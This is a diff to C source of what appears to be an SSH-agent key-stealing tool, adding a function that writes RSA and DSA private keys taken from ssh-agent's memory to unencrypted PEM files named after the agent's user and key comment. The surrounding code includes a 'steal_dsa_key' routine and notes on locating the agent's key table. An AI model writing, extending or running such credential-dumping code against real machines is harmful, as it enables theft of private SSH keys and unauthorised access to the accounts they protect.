@@ -22,7 +22,8 @@
  */
 
 // TODO:
-// 	1. resolve "idtable" from .bss
+// won't work with stripped executables:
+// 	1. resolve "idtable" from .bss 
 // 	2. resolve all keys in idtable
 // 		see also TAILQ stuff (defined in openssh/openbsd-compat/sys-queue.h)
 // 	3. dump all keys
@@ -42,6 +43,7 @@
 #include <time.h>
 #include <getopt.h>
 
+#include <openssl/pem.h>
 #include <openssl/rsa.h>
 #include <openssl/dsa.h>
 #include <openssl/evp.h>
@@ -307,6 +309,30 @@ int steal_dsa_key(linear_handle lin, Key* key)
 	return 0;
 }}}
 
+//
+int key_save_private(Key* key, char* filename)
+{
+	FILE *f;
+	int suc = -1;
+
+	// open file
+	f = fopen(filename, "w");
+	if(f == NULL) {
+		printf("failed to open file \"%s\".\n", filename);
+		return -1;
+	}
+
+	// dump a rsa key
+	if(key->rsa)
+		suc = PEM_write_RSAPrivateKey(f, key->rsa, /*cipher*/ NULL, /*passphrase*/ NULL, /*len of passphrase*/ 0, NULL, NULL);
+	// dump a dsa key
+	if(key->dsa)
+		suc = PEM_write_DSAPrivateKey(f, key->dsa, /*cipher*/ NULL, /*passphrase*/ NULL, /*len of passphrase*/ 0, NULL, NULL);
+
+	fclose(f);
+	return suc;
+};
+
 // create a unique filename, consisting of UUID, ssh-agent's
 // username and key's comment and save the key to this file.
 void save_key(char *key_comment, Key* key, char *username)
@@ -342,7 +368,8 @@ void save_key(char *key_comment, Key* key, char *username)
 
 	// dump the key
 	printf("\t\t" TERM_CYAN "dumping key \"%s\" to file \"%s\"" TERM_RESET "\n", comment_field, filename);
-	key_save_private(key, filename, "", comment_field);
+	//key_save_private(key, filename, "", comment_field);
+	key_save_private(key, filename);
 
 	free(comment_field);
 	free(filename);
